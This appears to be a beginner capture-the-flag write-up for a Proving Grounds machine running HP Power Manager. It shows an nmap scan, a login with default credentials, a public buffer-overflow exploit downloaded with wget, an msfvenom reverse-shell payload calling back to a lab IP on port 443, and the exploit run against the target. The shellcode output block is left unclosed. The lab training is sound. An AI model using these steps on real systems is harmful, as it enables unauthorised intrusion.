Welcome to our latest lab session in Proving Grounds! In this post, we'll demonstrate how to adapt an existing buffer overflow exploit for an older version of Windows to work on a newer release. This lab is considered to be a beginner lab as only porting existing exploit code is required.

## Discovery

We start off with a nmap scan and scan all open tcp ports using the '-p-' argument. The following output appears after waiting for the scan to complete.

```bash
sudo nmap -p- -vv -Pn -A -T4 -sV 192.168.233.45 -oA ./fulltcp
```

The port scan suggests that we are likely dealing with a Windows machine, as indicated by the presence of commonly open ports that are characteristic of Windows environments. For instance, port 445/tcp is associated with the Server Message Block (SMB) protocol, which is used for file sharing and network resource access. Additionally, port 3389/tcp is used for Remote Desktop Protocol (RDP), allowing users to connect remotely to a Windows system. The scan also reveals other relevant ports, such as 135/tcp and 139/tcp, which are used for various Windows services, including RPC and NetBIOS.

The machine also hosts a web application, which presents a valuable opportunity for further exploration. In cases like this, especially in a lab environment, starting with the web application is often a prudent approach, as it can yield interesting findings. By investigating the web server, we may uncover useful information that could shed light on the underlying system architecture and functionality. This could include identifying technologies in use, potential vulnerabilities, or even configuration details that help us better understand the overall environment we're dealing with.

The page displays a login screen for HP Power Manager, which, upon first glance, appears somewhat dated in its design. The user interface lacks modern aesthetics and functionality, giving it an older feel that may suggest it hasn’t been updated in a while.

Using the default credentials of admin/admin grants us access to the interface, revealing some insights into the application behind it.

Let’s take a look at Searchsploit to check for any vulnerabilities related to HP Power Manager. By searching the database, we can identify known exploits, security issues, or weaknesses associated with this application.

It appears that the application we are dealing with is vulnerable to a buffer overflow vulnerability. This type of vulnerability can allow an attacker to manipulate the application’s memory, potentially leading to arbitrary code execution or denial of service.

By utilizing Searchsploit with the -w flag, we can pinpoint the URL (https://www.exploit-db.com/exploits/10099) that provides access to the exploit code associated with this vulnerability. This will enable us to review the specific details of the exploit, including its mechanics and any prerequisites for successful execution.

The provided exploit code targets a buffer overflow vulnerability in HP Power Manager and has been specifically tested on Windows 2003 Enterprise SP2 English and Windows XP SP2 English. We can identify that the code is written in Python 2 due to several key features:

1. **Print Statement**: The use of `print` statements without parentheses (e.g., `print "HP Power Manager Administration Universal Buffer Overflow Exploit"`) is characteristic of Python 2 syntax. In Python 3, `print` is a function and requires parentheses.

2. **String Handling**: The code employs string formatting and concatenation in a manner typical of Python 2. For instance, the `%` operator is used for string interpolation, which is less common in modern Python 3 code, where f-strings or the `format()` method are preferred.

The exploit works by sending a specially crafted HTTP POST request to the application, attempting to manipulate its memory by overwriting the return address with a location that can execute arbitrary code. The payload is constructed in the `evil` variable, which includes the necessary HTTP headers and the crafted buffer. As noted in the comments, this exploit demonstrates the significant security risks associated with outdated software, especially when default credentials remain in use.

I frequently search for new code to see if anyone has already taken the initiative to convert older projects to newer versions, such as Python 3. This proactive approach not only saves me time but also ensures that I can leverage the latest features and improvements in the language.

I will use this Python 3 code (https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py) example as a starting point and explore how we can port the existing code to ensure it works effectively.


## Exploit

We will download the exploit code and open it with a text editor of our choice. 

```bash
wget https://raw.githubusercontent.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/refs/heads/master/hp_pm_exploit_p3.py
nano hp_pm_exploit_p3.py
```

With buffer overflows often the command to generate the shellcode is added as a comment. This is also the case for our exploit.

![image](https://github.com/user-attachments/assets/434e1fd7-f86e-4d02-851e-b0eb822f7c1f)

We will use the msfvenom command to generate our own shellcode that will work with the buffer overflow. It’s crucial to remember to change the LHOST value to your own IP address to ensure the shellcode can establish a connection back to our machine. For the LPORT, we will select 443/tcp, as this port is commonly permitted on firewalls.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```

This outputs the following:

```bash

In the example code the 'b' in front of every line is not used. Lets remove it for our payload as well.

This results in the following code pasted in to the exploit.

We save our exploit and are ready to try it on the server. We will look at the script to see how to interact with it. In this case there is a help menu available.

It seems that the tool automatically starts up a listener.

Time for action.

```bash
python3 hp_pm_exploit_p3.py 192.168.233.45 80 443
```

The exploit works!
